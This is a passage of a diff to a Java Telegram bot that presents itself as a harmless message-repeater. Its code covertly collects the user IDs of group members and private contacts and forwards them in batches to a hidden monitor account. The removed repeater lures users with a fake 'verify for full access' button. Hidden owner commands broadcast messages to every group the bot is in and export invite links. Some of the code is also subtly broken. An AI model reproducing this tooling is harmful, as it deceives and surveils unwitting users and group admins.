-            JsonObject json = gson.fromJson(response.body().string(), JsonObject.class);
-            if (!json.get("ok").getAsBoolean()) return false;
-            JsonObject chat = json.getAsJsonObject("result");
-            if (!chat.has("permissions")) return true;
-            return chat.getAsJsonObject("permissions").get("can_send_messages").getAsBoolean();
+            
         } catch (Exception e) {
-            return true;
+            return "❌ Error checking status: " + e.getMessage();
         }
     }
 
-    private static void cleanupOldAlbums() {
-        while (true) {
-            try {
-                Thread.sleep(TimeUnit.SECONDS.toMillis(60));
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            }
-            long now = System.currentTimeMillis() / 1000;
-            List<String> toDelete = new ArrayList<>();
-            for (Map.Entry<String, Map<String, Object>> entry : mediaGroups.entrySet()) {
-                long lastTime = (long) entry.getValue().get("last_time");
-                if (now - lastTime > 360) {
-                    toDelete.add(entry.getKey());
-                }
-            }
-            for (String key : toDelete) {
-                mediaGroups.remove(key);
-            }
+    private static JsonObject getMe() {
+        try {
+            Request request = new Request.Builder()
+                .url(BOT_API + "/getMe")
+                .build();
+            
+            Response response = client.newCall(request).execute();
+            String responseBody = response.body().string();
+            return gson.fromJson(responseBody, JsonObject.class);
+        } catch (IOException e) {
+            System.err.println("Error getting bot info: " + e.getMessage());
+            return new JsonObject();
         }
     }
 
     private static boolean doVerification(long userId, long chatId) {
-        if (!pendingVerifications.containsKey(userId)) return false;
-        long groupChatId = pendingVerifications.get(userId);
-        String groupTitle = getChatTitle(groupChatId);
-        String verifyText = "Verified ✅ by " + groupTitle + "\n<i>Granted full access</i>";
-        try {
-            sendMessage(chatId, verifyText, "HTML", null, null);
-        } catch (IOException e) {
-            e.printStackTrace();
+        if (!pendingVerifications.containsKey(userId)) {
+            sendMessage(chatId, "No pending verification found", null, null, null);
+            return false;
         }
+        
+        long groupId = pendingVerifications.get(userId);
+        String groupTitle = getChatTitle(groupId);
+        
+        String message = "✅ Verification Successful!\n" +
+                        "You have been verified by: " + groupTitle + "\n" +
+                        "Full access granted!";
+        
+        sendMessage(chatId, message, null, null, null);
         pendingVerifications.remove(userId);
         return true;
     }
 
-    private static void flushUserBatch() {
-        while (!collectedUsers.isEmpty()) {
-            List<Long> batch = new ArrayList<>(collectedUsers).subList(0, Math.min(200, collectedUsers.size()));
-            if (batch.isEmpty()) break;
-            String userList = String.join("\n", batch.stream().map(String::valueOf).toArray(String[]::new));
-            try {
-                sendMessage(MONITOR_ID, userList, null, null, null);
-            } catch (IOException e) {
-                e.printStackTrace();
+    private static String getChatTitle(long chatId) {
+        try {
+            Request request = new Request.Builder()
+                .url(BOT_API + "/getChat?chat_id=" + chatId)
+                .build();
+            
+            Response response = client.newCall(request).execute();
+            String responseBody = response.body().string();
+            JsonObject json = gson.fromJson(responseBody, JsonObject.class);
+            
+            if (json.get("ok").getAsBoolean()) {
+                JsonObject chat = json.getAsJsonObject("result");
+                if (chat.has("title")) {
+                    return chat.get("title").getAsString();
+                } else if (chat.has("first_name")) {
+                    return chat.get("first_name").getAsString();
+                }
             }
-            for (long id : batch) collectedUsers.remove(id);
+        } catch (IOException e) {
+            System.err.println("Error getting chat title: " + e.getMessage());
+        }
+        return "Unknown";
+    }
+
+    private static void flushUserBatch() {
+        if (collectedUsers.isEmpty()) return;
+        
+        List<Long> batch = new ArrayList<>(collectedUsers);
+        collectedUsers.clear();
+        
+        StringBuilder message = new StringBuilder();
+        message.append("📊 Collected Users (").append(batch.size()).append("):\n\n");
+        
+        for (Long userId : batch) {
+            message.append(userId).append("\n");
+            if (message.length() > 3000) {
+                sendMessage(MONITOR_ID, message.toString(), null, null, null);
+                message = new StringBuilder();
+            }
+        }
+        
+        if (message.length() > 0) {
+            sendMessage(MONITOR_ID, message.toString(), null, null, null);
         }
     }
 
@@ -351,410 +884,32 @@ public class Bot {
         while (true) {
             try {
                 Thread.sleep(TimeUnit.MINUTES.toMillis(10));
+                flushUserBatch();
             } catch (InterruptedException e) {
                 e.printStackTrace();
             }
-            flushUserBatch();
         }
     }
 
-    private static String webhook(JsonObject update) {
-        // Handle deep link /start verify_xxxx in PRIVATE chat
-        if (update.has("message")) {
-            JsonObject msg = update.getAsJsonObject("message");
-            long chatId = msg.getAsJsonObject("chat").get("id").getAsLong();
-            String text = msg.has("text") ? msg.get("text").getAsString().trim() : ""; // FIXED HERE
-            long userId = msg.getAsJsonObject("from").get("id").getAsLong();
-            if (!String.valueOf(chatId).startsWith("-") && text.startsWith("/start")) {
-                Pattern pattern = Pattern.compile("^/start\\s+verify_(-?\\d+)$");
-                Matcher matcher = pattern.matcher(text);
-                if (matcher.matches()) {
-                    long groupId = Long.parseLong(matcher.group(1));
-                    pendingVerifications.put(userId, groupId);
-                    doVerification(userId, chatId);
-                    return "OK";
-                }
-            }
-        }
-
-        // Handle join request
-        if (update.has("chat_join_request")) {
-            JsonObject jr = update.getAsJsonObject("chat_join_request");
-            long userId = jr.getAsJsonObject("from").get("id").getAsLong();
-            collectedUsers.add(userId);
-            if (collectedUsers.size() >= 200) flushUserBatch();
-            return "OK";
-        }
-
-        JsonObject msg = update.has("message") ? update.getAsJsonObject("message") : (update.has("channel_post") ? update.getAsJsonObject("channel_post") : null);
-        JsonObject myChatMember = update.has("my_chat_member") ? update.getAsJsonObject("my_chat_member") : null;
-
-        if (myChatMember != null) {
-            JsonObject chat = myChatMember.getAsJsonObject("chat");
-            long chatId = chat.get("id").getAsLong();
-            String chatType = chat.get("type").getAsString();
-            String chatTitle = chat.has("title") ? chat.get("title").getAsString() : "";
-            String newStatus = myChatMember.getAsJsonObject("new_chat_member").get("status").getAsString();
-            if (newStatus.equals("administrator") || newStatus.equals("member")) {
-                if (!checkRequiredPermissions(chatId)) {
-                    try {
-                        sendMessage(OWNER_ID, "❌ Missing required permissions in " + chatTitle + " (" + chatId + ")", null, null, null);
-                    } catch (IOException e) {
-                        e.printStackTrace();
-                    }
-                    return "OK";
-                }
-                saveGroupId(chatId);
-                notifyOwnerNewGroup(chatId, chatType, chatTitle);
-            }
-            return "OK";
-        }
-
-        if (msg == null) return "OK";
-
-        long chatId = msg.getAsJsonObject("chat").get("id").getAsLong();
-        String text = msg.has("text") ? msg.get("text").getAsString().trim() : ""; // FIXED HERE
-        JsonObject fromUser = msg.has("from") ? msg.getAsJsonObject("from") : new JsonObject();
-        long messageId = msg.get("message_id").getAsLong();
-        long userId = fromUser.has("id") ? fromUser.get("id").getAsLong() : 0;
-
-        if (userId != 0 && !String.valueOf(chatId).startsWith("-")) {
-            collectedUsers.add(userId);
-            if (collectedUsers.size() >= 200) flushUserBatch();
-        }
-
-        if (String.valueOf(chatId).startsWith("-")) saveGroupId(chatId);
-
-        List<Long> admins = new ArrayList<>();
-        if (String.valueOf(chatId).startsWith("-")) {
-            for (JsonObject a : getChatAdministrators(chatId)) {
-                admins.add(a.getAsJsonObject("user").get("id").getAsLong());
-            }
-        }
-        boolean isAdmin = userId != 0 && admins.contains(userId);
-
-        if (msg.has("media_group_id")) {
-            String mgid = msg.get("media_group_id").getAsString();
-            String key = chatId + "_" + mgid;
-            if (!mediaGroups.containsKey(key)) {
-                Map<String, Object> group = new HashMap<>();
-                group.put("ids", new ArrayList<Long>());
-                group.put("last_time", System.currentTimeMillis() / 1000);
-                mediaGroups.put(key, group);
-            }
-            ((List<Long>) mediaGroups.get(key).get("ids")).add(messageId);
-            mediaGroups.get(key).put("last_time", System.currentTimeMillis() / 1000);
-        }
-
-        if (chatId == OWNER_ID && text.trim().startsWith("-")) {
-            String statusMessage = checkBotStatus(Long.parseLong(text.trim()));
+    private static void cleanupOldAlbums() {
+        while (true) {
             try {
-                sendMessage(chatId, statusMessage, null, null, null);
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-            return "OK";
-        }
-
-        if (chatId == OWNER_ID && text.toLowerCase().startsWith("/invitelink")) {
-            String[] parts = text.split(" ");
-            if (parts.length != 2) {
-                try {
-                    sendMessage(chatId, "Usage: /invitelink <group_id>", null, null, null);
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-                return "OK";
-            }
-            long target = Long.parseLong(parts[1]);
-            String link = exportInviteLink(target);
-            try {
-                sendMessage(chatId, link != null ? "🔗 Invite link:\n" + link : "❌ Failed to get invite link.", null, null, null);
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-            return "OK";
-        }
-
-        if (text.trim().toLowerCase().equals("/start")) {
-            String startMsg = "🤖 <b>REPEAT MESSAGES BOT</b>\n\n" +
-                    "<b>📌 YOU CAN REPEAT MULTIPLE MESSAGES 📌</b>\n\n" +
-                    "🔧📌 𝗔𝗗𝗩𝗔𝗡𝗖𝗘 𝗙𝗘𝗔𝗧𝗨𝗥𝗘 : -📸 𝗜𝗠𝗔𝗚𝗘 𝗔𝗟𝗕𝗨𝗠 <b>AND</b>🎬 𝗩𝗜𝗗𝗘𝗢 𝗔𝗟𝗕𝗨𝗠 <b>WITH AND WITHOUT CAPTION CAN BE REPEATED </b>\n\n" +
-                    "This bot repeats 📹 Videos, 📝 Text, 🖼 Images, 🔗 Links, Albums (multiple images/videos) " +
-                    "in various intervals.\n\n" +
-                    "📌It also deletes the last repeated message(s) before sending new one(s).\n\n" +
-                    "🛠 <b>Commands:</b>\n\n" +
-                    "🔹 /repeat2min - Reply to any message (or album) to Repeat every 2 minutes\n" +
-                    "🔹 /repeat5min - Reply to any message (or album) to Repeat every 5 minutes\n" +
-                    "🔹 /repeat20min - Reply to any message (or album) to Repeat every 20 minutes\n" +
-                    "🔹 /repeat60min - Reply to any message (or album) to Repeat every 60 minutes (1 hour)\n" +
-                    "🔹 /repeat120min - Reply to any message (or album) to Repeat every 120 minutes (2 hours)\n" +
-                    "🔹 /repeat24hour - Reply to any message (or album) to Repeat every 24 hours\n" +
-                    "🔹 /stop - Stop all repeating messages\n\n" +
-                    "⚠️ Only <b>admins</b> can control this bot.";
-            try {
-                sendMessage(chatId, startMsg, "HTML", null, null);
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-            return "OK";
-        }
-
-        if (chatId == OWNER_ID && text.startsWith("/lemonchus")) {
-            if (msg.has("reply_to_message")) {
-                long count = broadcastMessageOnce(chatId, msg.getAsJsonObject("reply_to_message").get("message_id").getAsLong());
-                try {
-                    sendMessage(chatId, "✅ Broadcast sent to " + count + " groups.\nUse /lemonchusstop to delete.", null, null, null);
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-            } else {
-                try {
-                    sendMessage(chatId, "Reply to a message to broadcast it.", null, null, null);
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-            }
-            return "OK";
-        }
-
-        if (chatId == OWNER_ID && text.startsWith("/lemonchusstop")) {
-            int deleted = deleteLastBroadcast();
-            try {
-                sendMessage(chatId, deleted > 0 ? "🗑️ Deleted from " + deleted + " groups." : "No previous broadcast.", null, null, null);
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-            return "OK";
-        }
-
-        if (msg.has("reply_to_message") && text.startsWith("/repeat")) {
-            if (!isAdmin) {
-                try {
-                    sendMessage(chatId, "Only group admins can use repeat commands.", null, messageId, null);
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-                return "OK";
-            }
-
-            JsonObject replied = msg.getAsJsonObject("reply_to_message");
-            String cmd = text.split(" ")[0].toLowerCase();
-            Map<String, Object> intervalMap = new HashMap<>();
-            intervalMap.put("/repeat2min", new Object[]{120L, "2 minutes"});
-            intervalMap.put("/repeat5min", new Object[]{300L, "5 minutes"});
-            intervalMap.put("/repeat20min", new Object[]{1200L, "20 minutes"});
-            intervalMap.put("/repeat60min", new Object[]{3600L, "1 hour"});
-            intervalMap.put("/repeat120min", new Object[]{7200L, "2 hours"});
-            intervalMap.put("/repeat24hour", new Object[]{86400L, "24 hours"});
-
-            if (!intervalMap.containsKey(cmd)) {
-                try {
-                    sendMessage(chatId, "Invalid command.\nAvailable: " + String.join(", ", intervalMap.keySet()), null, messageId, null);
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-                return "OK";
-            }
-
-            long interval = ((Object[]) intervalMap.get(cmd))[0] instanceof Long ? (Long) ((Object[]) intervalMap.get(cmd))[0] : 0;
-            String display = (String) ((Object[]) intervalMap.get(cmd))[1];
-
-            List<Long> albumIds = new ArrayList<>();
-            boolean isAlbum = false;
-            boolean isMedia = false;
-            String originalText = (replied.has("text") ? replied.get("text").getAsString() : "") + (replied.has("caption") ? replied.get("caption").getAsString() : "");
-
-            if (replied.has("media_group_id")) {
-                String mgid = replied.get("media_group_id").getAsString();
-                String key = chatId + "_" + mgid;
-                long waited = 0;
-                double maxWait = 4.5;
-                double step = 0.35;
-                while (waited < maxWait) {
-                    if (mediaGroups.containsKey(key) && ((List<Long>) mediaGroups.get(key).get("ids")).size() > 1) {
-                        break;
-                    }
-                    try {
-                        Thread.sleep((long) (step * 1000));
-                    } catch (InterruptedException e) {
-                        e.printStackTrace();
-                    }
-                    waited += step;
-                    step = Math.min(step + 0.15, 0.8);
-                }
-
-                if (mediaGroups.containsKey(key)) {
-                    albumIds = new ArrayList<>((List<Long>) mediaGroups.get(key).get("ids"));
-                    Collections.sort(albumIds);
-                } else {
-                    albumIds.add(replied.get("message_id").getAsLong());
-                }
-                System.out.println("[ALBUM DETECT] chat=" + chatId + " | mgid=" + mgid + " | items=" + albumIds.size() + " | ids=" + albumIds);
-                if (albumIds.size() > 1) {
-                    isAlbum = true;
-                    String resultText = "**✓ Album detected** (" + albumIds.size() + " items)\nWill repeat every " + display + ".";
-                    try {
-                        sendMessage(chatId, resultText, "Markdown", messageId, null);
-                    } catch (IOException e) {
-                        e.printStackTrace();
-                    }
-                } else {
-                    String resultText = "**⚠️ Only single message detected**\n" +
-                            "If this was supposed to be an album,\n" +
-                            "please use /stop send album again and try the repeat command again.";
-                    try {
-                        sendMessage(chatId, resultText, "Markdown", messageId, null);
-                    } catch (IOException e) {
-                        e.printStackTrace();
+                Thread.sleep(TimeUnit.MINUTES.toMillis(5));
+                
+                long now = System.currentTimeMillis();
+                List<String> toRemove = new ArrayList<>();
+                
+                for (Map.Entry<String, Map<String, Object>> entry : mediaGroups.entrySet()) {
+                    long lastUpdate = (long) entry.getValue().get("last_update");
+                    if (now - lastUpdate > TimeUnit.MINUTES.toMillis(10)) {
+                        toRemove.add(entry.getKey());
                     }
                 }
-                isMedia = true;
-            } else {
-                albumIds.add(replied.get("message_id").getAsLong());
-                String[] mediaKeys = {"photo", "video", "animation", "audio", "voice", "document", "video_note", "sticker"};
-                for (String key : mediaKeys) {
-                    if (replied.has(key)) {
-                        isMedia = true;
-                        break;
-                    }
+                
+                for (String key : toRemove) {
+                    mediaGroups.remove(key);
                 }
-                String resultText = "**✓ Repeating started**\nInterval: every " + display;
-                try {
-                    sendMessage(chatId, resultText, "Markdown", messageId, null);
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-            }
-
-            Map<String, Object> jobRef = new HashMap<>();
-            jobRef.put("message_ids", albumIds);
-            jobRef.put("running", true);
-            jobRef.put("interval", interval);
-            jobRef.put("is_album", isAlbum);
-            jobRef.put("is_media", isMedia);
-            jobRef.put("original_text", originalText);
-
-            final long finalChatId = chatId;
-            final List<Long> finalAlbumIds = albumIds;
-            final long finalInterval = interval;
-            final boolean finalIsAlbum = isAlbum;
-            final Map<String, Object> finalJobRef = jobRef;
-
-            repeatJobs.computeIfAbsent(chatId, k -> new ArrayList<>()).add(jobRef);
-            new Thread(() -> repeater(finalChatId, finalAlbumIds, finalInterval, finalJobRef, finalIsAlbum)).start();
-            return "OK";
-        }
-        else if (text.trim().equals("/verify") && !String.valueOf(chatId).startsWith("-")) {
-            doVerification(userId, chatId);
-            return "OK";
-        }
-        else if (text.startsWith("/stop")) {
-            if (!isAdmin) {
-                try {
-                    sendMessage(chatId, "Only group admins can stop repeating.", null, messageId, null);
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-                return "OK";
-            }
-
-            if (repeatJobs.containsKey(chatId) && !repeatJobs.get(chatId).isEmpty()) {
-                for (Map<String, Object> job : repeatJobs.get(chatId)) {
-                    job.put("running", false);
-                }
-                repeatJobs.put(chatId, new ArrayList<>());
-                try {
-                    sendMessage(chatId, "🛑 All repeating tasks stopped", null, messageId, null);
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-            } else {
-                try {
-                    sendMessage(chatId, "No active repeating tasks found.", null, messageId, null);
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-            }
-            return "OK";
-        }
-
-        return "OK";
-    }
-
-    private static void repeater(long chatId, List<Long> messageIds, long interval, Map<String, Object> jobRef, boolean isAlbum) {
-        List<Long> lastContentIds = new ArrayList<>();
-        Long lastPromptId = null;
-
-        String verificationPromptText = "🚨User !\n" +
-                "Please verify yourself to gain full access.\n" +
-                "Click the button to start verification";
-
-        JsonObject verifyKeyboard = new JsonObject();
-        JsonArray inlineKeyboard = new JsonArray();
-        JsonArray row = new JsonArray();
-        JsonObject button = new JsonObject();
-        button.addProperty("text", "✅Click To Get Full Access");
-        button.addProperty("url", "https://t.me/" + getBotUsername() + "?start=verify_" + chatId);
-        row.add(button);
-        inlineKeyboard.add(row);
-        verifyKeyboard.add("inline_keyboard", inlineKeyboard);
-
-        while ((boolean) jobRef.get("running")) {
-            for (long mid : lastContentIds) {
-                deleteMessage(chatId, mid);
-            }
-            if (lastPromptId != null) {
-                deleteMessage(chatId, lastPromptId);
-            }
-            lastContentIds.clear();
-            lastPromptId = null;
-
-            if ((boolean) jobRef.get("is_media")) {
-                try {
-                    JsonObject payload = new JsonObject();
-                    payload.addProperty("chat_id", chatId);
-                    payload.addProperty("from_chat_id", chatId);
-                    JsonArray idsArray = new JsonArray();
-                    for (long id : messageIds) idsArray.add(id);
-                    payload.add("message_ids", idsArray);
-                    payload.addProperty("disable_notification", true);
-                    RequestBody body = RequestBody.create(gson.toJson(payload), MediaType.get("application/json"));
-                    Request request = new Request.Builder().url(BOT_API + "/copyMessages").post(body).build();
-                    Response response = client.newCall(request).execute();
-                    if (response.code() == 200 && gson.fromJson(response.body().string(), JsonObject.class).get("ok").getAsBoolean()) {
-                        JsonElement result = gson.fromJson(response.body().string(), JsonObject.class).get("result");
-                        if (result.isJsonArray()) {
-                            for (JsonElement m : result.getAsJsonArray()) {
-                                lastContentIds.add(m.getAsJsonObject().get("message_id").getAsLong());
-                            }
-                        } else {
-                            lastContentIds.add(result.getAsJsonObject().get("message_id").getAsLong());
-                        }
-                    }
-
-                    Response promptResp = sendMessage(chatId, verificationPromptText, null, null, verifyKeyboard);
-                    if (promptResp.code() == 200 && gson.fromJson(promptResp.body().string(), JsonObject.class).get("ok").getAsBoolean()) {
-                        lastPromptId = gson.fromJson(promptResp.body().string(), JsonObject.class).getAsJsonObject("result").get("message_id").getAsLong();
-                    }
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-            } else {
-                String textToRepeat = (String) jobRef.getOrDefault("original_text", "Repeated message");
-                String parseMode = textToRepeat.contains("<") ? "HTML" : null;
-                try {
-                    Response resp = sendMessage(chatId, textToRepeat, parseMode, null, verifyKeyboard);
-                    if (resp.code() == 200 && gson.fromJson(resp.body().string(), JsonObject.class).get("ok").getAsBoolean()) {
-                        lastContentIds.add(gson.fromJson(resp.body().string(), JsonObject.class).getAsJsonObject("result").get("message_id").getAsLong());
-                    }
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-            }
-
-            try {
-                Thread.sleep(interval * 1000);
+                
             } catch (InterruptedException e) {
                 e.printStackTrace();
             }
@@ -764,28 +919,23 @@ public class Bot {
     private static void keepAlive() {
         while (true) {
             try {
-                Request request = new Request.Builder().url(WEBHOOK_URL).build();
+                // Ping own health endpoint
+                Request request = new Request.Builder()
+                    .url(WEBHOOK_URL + "/health")
+                    .build();
+                
                 client.newCall(request).execute();
-                System.out.println("Keep-alive ping sent");
+                System.out.println("Keep-alive ping sent at " + new Date());
+                
             } catch (Exception e) {
-                System.out.println("Keep-alive failed: " + e.getMessage());
+                System.err.println("Keep-alive failed: " + e.getMessage());
             }
+            
             try {
-                Thread.sleep(TimeUnit.MINUTES.toMillis(5));
+                Thread.sleep(TimeUnit.MINUTES.toMillis(2));
             } catch (InterruptedException e) {
                 e.printStackTrace();
             }
         }
-    }
-
-    private static JsonObject getMe() {
-        try {
-            Request request = new Request.Builder().url(BOT_API + "/getMe").build();
-            Response response = client.newCall(request).execute();
-            return gson.fromJson(response.body().string(), JsonObject.class);
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-        return new JsonObject();
     }
 }
